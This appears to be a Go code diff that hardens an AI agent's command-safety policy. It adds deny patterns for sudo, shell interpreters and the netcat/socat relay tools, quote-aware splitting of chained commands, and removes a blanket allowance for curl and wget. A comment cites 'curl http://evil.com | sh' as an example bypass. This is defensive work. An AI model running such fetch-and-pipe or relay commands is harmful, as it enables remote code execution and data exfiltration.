@@ -88,15 +88,25 @@ var spawnBlockedToolNames = map[string]struct{}{
 	"spawn_session": {},
 }
 
+// sandboxOnlyPatterns matches commands that are only allowed in sandbox mode.
+// Uses (\s|$) suffix instead of $ anchor so arguments like "sudo rm -rf /" are
+// also caught — bare $ would only match "sudo" with nothing after it.
+//
+// Shell interpreters (sh, bash, zsh, etc.) are included because they can
+// execute arbitrary piped input, making them a common bypass vector when
+// combined with chaining operators (e.g. "curl http://evil.com | sh").
 var sandboxOnlyPatterns = []*regexp.Regexp{
-	regexp.MustCompile(`^sudo$|^su$|^kill$|^pkill$|^killall$|^reboot$|^shutdown$`),
-	regexp.MustCompile(`^eval$|^source$|^\.$`),
+	regexp.MustCompile(`^sudo(\s|$)|^su(\s|$)|^kill(\s|$)|^pkill(\s|$)|^killall(\s|$)|^reboot(\s|$)|^shutdown(\s|$)`),
+	regexp.MustCompile(`^eval(\s|$)|^source(\s|$)|^\.(\s|$)`),
+	regexp.MustCompile(`^sh(\s|$)|^bash(\s|$)|^zsh(\s|$)|^fish(\s|$)|^dash(\s|$)|^ksh(\s|$)|^csh(\s|$)|^tcsh(\s|$)`),
 }
 
 var noSandboxMutatingCommands = map[string]struct{}{
 	"rm": {}, "rmdir": {}, "mv": {}, "cp": {}, "mkdir": {}, "touch": {},
 	"chmod": {}, "chown": {}, "chgrp": {}, "ln": {}, "tee": {}, "truncate": {},
 	"dd": {}, "shred": {}, "install": {}, "mkfifo": {}, "mknod": {},
+	// Network relay/exfiltration tools — can pipe data to arbitrary hosts.
+	"nc": {}, "ncat": {}, "netcat": {}, "socat": {},
 }
 
 var gitSafeSubcommands = map[string]struct{}{
@@ -108,6 +118,11 @@ var gitSafeSubcommands = map[string]struct{}{
 	"diff-index": {}, "archive": {}, "cherry": {}, "range-diff": {}, "help": {}, "version": {},
 	"config": {}, "reflog": {}, "worktree": {},
 }
+
+// operatorRe matches shell chaining operators without requiring surrounding
+// whitespace.  Multi-char operators (||, &&) are listed before the single-char
+// | so the regex engine prefers the longer match at each position.
+var operatorRe = regexp.MustCompile(`\|\||&&|;|\|`)
 
 func EvaluateToolCall(call ToolCall, env EvalEnv) Decision {
 	policy := resolvePolicy(env)
@@ -309,17 +324,85 @@ func validateURL(rawURL string, policy PolicyInfo) string {
 	return "Sandbox deny: network access to " + host + " is not in network.allowedDomains."
 }
 
+// stripQuotedSegments replaces single- and double-quoted strings with
+// placeholder text so that shell operators inside quotes are not treated as
+// real chaining operators.  The result is only used for operator-detection;
+// token parsing still runs on the original command string.
+//
+// Handles backslash escapes inside double-quoted strings (e.g. \" does not
+// close the string).  Single-quoted strings are treated as fully literal —
+// bash does not allow any escape sequence inside single quotes.
+func stripQuotedSegments(command string) string {
+	var buf strings.Builder
+	inSingle := false
+	inDouble := false
+	for i := 0; i < len(command); i++ {
+		c := command[i]
+		switch {
+		case inDouble && c == '\\':
+			// Backslash inside double quotes escapes the next character.
+			// Mask both the backslash and the character it escapes so that an
+			// escaped quote (\"  ) does not prematurely close the string.
+			buf.WriteByte('X')
+			if i+1 < len(command) {
+				i++
+				buf.WriteByte('X')
+			}
+		case c == '\'' && !inDouble:
+			inSingle = !inSingle
+			buf.WriteByte('X')
+		case c == '"' && !inSingle:
+			inDouble = !inDouble
+			buf.WriteByte('X')
+		case inSingle || inDouble:
+			buf.WriteByte('X') // mask content inside quotes
+		default:
+			buf.WriteByte(c)
+		}
+	}
+	return buf.String()
+}
+
+// splitOnFirstOperator finds the leftmost shell chaining operator (||, &&, ;,
+// or |) in the quote-stripped version of the command and returns the left and
+// right sub-commands from the original (unstripped) string, trimmed of
+// surrounding whitespace so that recursive evaluation starts clean.
+func splitOnFirstOperator(original, stripped string) (left, right string, ok bool) {
+	loc := operatorRe.FindStringIndex(stripped)
+	if loc == nil {
+		return "", "", false
+	}
+	return strings.TrimSpace(original[:loc[0]]), strings.TrimSpace(original[loc[1]:]), true
+}
+
+// isDestructiveCommand returns true if the given shell command (or any
+// sub-command produced by splitting on chaining operators) would be considered
+// destructive.
 func isDestructiveCommand(command string, sandboxActive bool) bool {
 	command = strings.TrimSpace(command)
 	if command == "" {
 		return false
 	}
+
+	// Fast path: sub-process substitution, newlines, and process substitution
+	// are always destructive regardless of quoting.
 	if strings.Contains(command, "$(") {
 		return true
 	}
 	if strings.Contains(command, "`") || strings.Contains(command, "\n") || strings.Contains(command, "<(") || strings.Contains(command, ">(") {
 		return true
 	}
+
+	// Check for shell chaining operators (;, &&, ||, |) by scanning the
+	// quote-stripped command so we don't fire on operators inside strings.
+	stripped := stripQuotedSegments(command)
+	if left, right, ok := splitOnFirstOperator(command, stripped); ok {
+		// If either side of the operator is destructive, the whole command is.
+		// Recursion handles deeper chains (a ; b ; c splits to (a) and (b ; c)).
+		return isDestructiveCommand(left, sandboxActive) || isDestructiveCommand(right, sandboxActive)
+	}
+
+	// No chaining operators found — evaluate this as a single command.
 	for _, pattern := range sandboxOnlyPatterns {
 		if pattern.MatchString(command) {
 			return true
@@ -347,9 +430,6 @@ func isDestructiveCommand(command string, sandboxActive bool) bool {
 	}
 	if first == "docker" && len(tokens) > 1 && strings.EqualFold(tokens[1], "push") {
 		return true
-	}
-	if first == "curl" || first == "wget" {
-		return false
 	}
 	if first == "gh" && len(tokens) > 2 {
 		group := strings.ToLower(tokens[1])
